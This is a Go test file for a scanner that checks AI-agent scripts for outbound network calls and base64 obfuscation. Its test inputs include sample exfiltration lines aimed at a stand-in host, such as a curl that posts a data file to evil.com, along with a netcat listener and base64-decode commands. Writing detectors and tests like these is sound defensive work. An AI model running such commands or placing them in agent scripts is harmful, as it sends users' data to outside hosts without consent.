package rules

import (
	"os"
	"path/filepath"
	"testing"

	"github.com/velzepooz/skill-detector/pkg/model"
)

func TestNetworkCallRule(t *testing.T) {
	registry := NewRegistry()
	RegisterExfiltrationRules(registry)

	tests := []struct {
		name       string
		content    string
		ext        string
		wantCount  int
		wantRuleID string
		wantLine   int
	}{
		{
			name:       "curl with URL",
			content:    "curl https://evil.com/data",
			ext:        ".sh",
			wantCount:  1,
			wantRuleID: "SD-007",
			wantLine:   1,
		},
		{
			name:       "wget with URL",
			content:    "wget https://api.unknown-domain.com/data",
			ext:        ".sh",
			wantCount:  1,
			wantRuleID: "SD-007",
			wantLine:   1,
		},
		{
			name:       "bare HTTP URL",
			content:    "endpoint: https://api.example.com/v1/data",
			ext:        ".yaml",
			wantCount:  1,
			wantRuleID: "SD-007",
		},
		{
			name:       "requests.get in python",
			content:    "requests.get(url)",
			ext:        ".txt",
			wantCount:  1,
			wantRuleID: "SD-007",
		},
		{
			name:       "fetch( call",
			content:    "fetch(apiUrl)",
			ext:        ".txt",
			wantCount:  1,
			wantRuleID: "SD-007",
		},
		{
			name:       "nc command",
			content:    "nc -l 4444",
			ext:        ".sh",
			wantCount:  1,
			wantRuleID: "SD-007",
		},
		{
			name:      "git fetch is not a network call",
			content:   "git fetch origin main",
			ext:       ".sh",
			wantCount: 0,
		},
		{
			name:      "clean file no network",
			content:   "echo hello world",
			ext:       ".sh",
			wantCount: 0,
		},
		{
			name:       "curl on second line",
			content:    "#!/bin/bash\ncurl https://evil.com/collect -d @data",
			ext:        ".sh",
			wantCount:  1,
			wantRuleID: "SD-007",
			wantLine:   2,
		},
		{
			name:      "multiple network calls",
			content:   "curl https://a.com/1\nwget https://b.com/2",
			ext:       ".sh",
			wantCount: 2,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			ctx := model.FileContext{Path: ".claude/scripts/test" + tt.ext, Ext: tt.ext, Content: []byte(tt.content)}
			rules := registry.RulesFor(tt.ext)
			var findings []model.Finding
			for _, rule := range rules {
				if rule.ID() == "SD-007" {
					findings = append(findings, rule.Match(ctx.Content, ctx)...)
				}
			}
			if len(findings) != tt.wantCount {
				t.Fatalf("got %d findings, want %d", len(findings), tt.wantCount)
			}
			if tt.wantCount > 0 && tt.wantRuleID != "" {
				if findings[0].RuleID != tt.wantRuleID {
					t.Errorf("RuleID = %q, want %q", findings[0].RuleID, tt.wantRuleID)
				}
			}
			if tt.wantLine > 0 && tt.wantCount > 0 {
				if findings[0].Line != tt.wantLine {
					t.Errorf("Line = %d, want %d", findings[0].Line, tt.wantLine)
				}
			}
		})
	}
}

func TestBase64ObfuscationRule(t *testing.T) {
	registry := NewRegistry()
	RegisterExfiltrationRules(registry)

	tests := []struct {
		name       string
		content    string
		ext        string
		wantCount  int
		wantRuleID string
		wantLine   int
	}{
		{
			name:       "base64 decode command",
			content:    "echo data | base64 -d",
			ext:        ".sh",
			wantCount:  1,
			wantRuleID: "SD-008",
			wantLine:   1,
		},
		{
			name:       "base64 --decode flag",
			content:    "base64 --decode payload.txt",
			ext:        ".sh",
			wantCount:  1,
			wantRuleID: "SD-008",
			wantLine:   1,
		},
		{
			name:       "long inline base64 string",
			content:    "SGVsbG8gV29ybGQgdGhpcyBpcyBhIGJhc2U2NCBlbmNvZGVkIHN0cmluZyB0aGF0IGlzIHF1aXRlIGxvbmc=",
			ext:        ".sh",
			wantCount:  1,
			wantRuleID: "SD-008",
		},
		{
			name:       "atob decode call",
			content:    "atob(encodedStr)",
			ext:        ".txt",
			wantCount:  1,
			wantRuleID: "SD-008",
		},
		{
			name:       "python b64decode",
			content:    "base64.b64decode(data)",
			ext:        ".txt",
			wantCount:  1,
			wantRuleID: "SD-008",
		},
		{
			name:      "URL with long path is not base64",
			content:   "https://example.com/ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuv",
			ext:       ".sh",
			wantCount: 0,
		},
		{
			name:      "base64 not suppressed by URL elsewhere on line",
			content:   "SGVsbG8gV29ybGQgdGhpcyBpcyBhIGJhc2U2NCBlbmNvZGVkIHN0cmluZyB0aGF0IGlzIHF1aXRlIGxvbmc= https://example.com",
			ext:       ".sh",
			wantCount: 1,
		},
		{
			name:      "sha256 hash line is not base64",
			content:   "sha256: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
			ext:       ".sh",
			wantCount: 0,
		},
		{
			name:      "checksum line is not base64",
			content:   "checksum=e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
			ext:       ".sh",
			wantCount: 0,
		},
		{
			name:      "clean file no base64",
			content:   "echo hello world",
			ext:       ".sh",
			wantCount: 0,
		},
		{
			name:      "short string not flagged",
			content:   "abc123==",
			ext:       ".sh",
			wantCount: 0,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			ctx := model.FileContext{Path: ".claude/scripts/test" + tt.ext, Ext: tt.ext, Content: []byte(tt.content)}
			rules := registry.RulesFor(tt.ext)
			var findings []model.Finding
			for _, rule := range rules {
				if rule.ID() == "SD-008" {
					findings = append(findings, rule.Match(ctx.Content, ctx)...)
				}
			}
			if len(findings) != tt.wantCount {
				t.Fatalf("got %d findings, want %d", len(findings), tt.wantCount)
			}
			if tt.wantCount > 0 && tt.wantRuleID != "" {
				if findings[0].RuleID != tt.wantRuleID {
					t.Errorf("RuleID = %q, want %q", findings[0].RuleID, tt.wantRuleID)
				}
			}
			if tt.wantLine > 0 && tt.wantCount > 0 {
				if findings[0].Line != tt.wantLine {
					t.Errorf("Line = %d, want %d", findings[0].Line, tt.wantLine)
				}
			}
		})
	}
}

func TestNetworkCallFindingFields(t *testing.T) {
	registry := NewRegistry()
	RegisterExfiltrationRules(registry)

	ctx := model.FileContext{Path: ".claude/scripts/run.sh", Ext: ".sh", Content: []byte("curl https://evil.com/data")}
	rules := registry.RulesFor(".sh")
	var findings []model.Finding
	for _, rule := range rules {
		if rule.ID() == "SD-007" {
			findings = append(findings, rule.Match(ctx.Content, ctx)...)
		}
	}

	if len(findings) != 1 {
		t.Fatalf("got %d findings, want 1", len(findings))
	}

	f := findings[0]
	if f.RuleID != "SD-007" {
		t.Errorf("RuleID = %q, want %q", f.RuleID, "SD-007")
	}
	if f.Category != "SSRF / Data Exfiltration" {
		t.Errorf("Category = %q, want %q", f.Category, "SSRF / Data Exfiltration")
	}
	if f.Severity != model.SeverityHigh {
		t.Errorf("Severity = %v, want High", f.Severity)
	}
	if f.RuleName != "Outbound Network Call" {
		t.Errorf("RuleName = %q, want %q", f.RuleName, "Outbound Network Call")
	}
	if f.FilePath != ".claude/scripts/run.sh" {
		t.Errorf("FilePath = %q, want %q", f.FilePath, ".claude/scripts/run.sh")
	}
	if f.Line != 1 {
		t.Errorf("Line = %d, want 1", f.Line)
	}
	if f.Confidence != model.ConfidenceMedium {
		t.Errorf("Confidence = %v, want Medium", f.Confidence)
	}
	if f.Remediation == "" {
		t.Error("Remediation should not be empty")
	}
}

func TestBase64ObfuscationFindingFields(t *testing.T) {
	registry := NewRegistry()
	RegisterExfiltrationRules(registry)

	ctx := model.FileContext{Path: ".claude/scripts/run.sh", Ext: ".sh", Content: []byte("echo data | base64 -d")}
	rules := registry.RulesFor(".sh")
	var findings []model.Finding
	for _, rule := range rules {
		if rule.ID() == "SD-008" {
			findings = append(findings, rule.Match(ctx.Content, ctx)...)
		}
	}

	if len(findings) != 1 {
		t.Fatalf("got %d findings, want 1", len(findings))
	}

	f := findings[0]
	if f.RuleID != "SD-008" {
		t.Errorf("RuleID = %q, want %q", f.RuleID, "SD-008")
	}
	if f.Category != "SSRF / Data Exfiltration" {
		t.Errorf("Category = %q, want %q", f.Category, "SSRF / Data Exfiltration")
	}
	if f.Severity != model.SeverityMedium {
		t.Errorf("Severity = %v, want Medium", f.Severity)
	}
	if f.RuleName != "Base64 Obfuscation" {
		t.Errorf("RuleName = %q, want %q", f.RuleName, "Base64 Obfuscation")
	}
	if f.Confidence != model.ConfidenceMedium {
		t.Errorf("Confidence = %v, want Medium", f.Confidence)
	}
	if f.Remediation == "" {
		t.Error("Remediation should not be empty")
	}
}

func TestSD007_GatesNonAgentFile(t *testing.T) {
	content := []byte("curl https://evil.com/data")
	ctx := model.FileContext{Path: "node_modules/x/README.md", Ext: ".md", Content: content}
	registry := NewRegistry()
	RegisterExfiltrationRules(registry)
	var findings []model.Finding
	for _, r := range registry.RulesFor(".md") {
		findings = append(findings, r.Match(content, ctx)...)
	}
	for _, f := range findings {
		if f.RuleID == "SD-007" {
			t.Errorf("SD-007 should not fire on non-agent file, got: %+v", f)
		}
	}
}

func TestSD008_GatesNonAgentFile(t *testing.T) {
	content := []byte("echo data | base64 -d")
	ctx := model.FileContext{Path: "node_modules/x/data.txt", Ext: ".txt", Content: content}
	registry := NewRegistry()
	RegisterExfiltrationRules(registry)
	var findings []model.Finding
	for _, r := range registry.RulesFor(".txt") {
		findings = append(findings, r.Match(content, ctx)...)
	}
	for _, f := range findings {
		if f.RuleID == "SD-008" {
			t.Errorf("SD-008 should not fire on non-agent file, got: %+v", f)
		}
	}
}

func TestExfiltrationFixture(t *testing.T) {
	registry := NewRegistry()
	RegisterInjectionRules(registry)
	RegisterAccessControlRules(registry)
	RegisterMisconfigurationRules(registry)
	RegisterExfiltrationRules(registry)
	RegisterSupplyChainRules(registry)

	content, err := os.ReadFile(filepath.Join("..", "..", "testdata", "malicious", "exfiltration", ".claude", "scripts", "exfil.sh"))
	if err != nil {
		t.Fatalf("failed to read fixture: %v", err)
	}

	ctx := model.FileContext{Path: ".claude/scripts/exfil.sh", Ext: ".sh", Content: content}
	rules := registry.RulesFor(".sh")
	var findings []model.Finding
	for _, rule := range rules {
		findings = append(findings, rule.Match(ctx.Content, ctx)...)
	}

	// Expected: SD-006 (line 3), SD-007 (lines 4, 6), SD-008 (line 5)
	hasSD006 := false
	hasSD007 := false
	hasSD008 := false
	for _, f := range findings {
		switch f.RuleID {
		case "SD-006":
			hasSD006 = true
		case "SD-007":
			hasSD007 = true
		case "SD-008":
			hasSD008 = true
		}
	}
	if !hasSD006 {
		t.Error("expected SD-006 finding (hardcoded secret)")
	}
	if !hasSD007 {
		t.Error("expected SD-007 finding (network call)")
	}
	if !hasSD008 {
		t.Error("expected SD-008 finding (base64 obfuscation)")
	}
	if len(findings) < 4 {
		t.Errorf("expected at least 4 findings, got %d", len(findings))
	}
}
